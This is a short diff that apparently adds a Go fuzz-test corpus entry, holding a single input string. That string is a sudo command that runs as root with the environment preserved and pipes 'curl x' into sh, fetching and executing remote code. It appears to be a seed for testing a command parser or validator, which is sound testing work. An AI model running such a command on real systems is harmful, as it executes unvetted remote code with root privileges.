@@ -1,0 +1,2 @@
+go test fuzz v1
+string("sudo -EHu root --preserve-env=PATH -- sh -c \"curl x | sh\"")
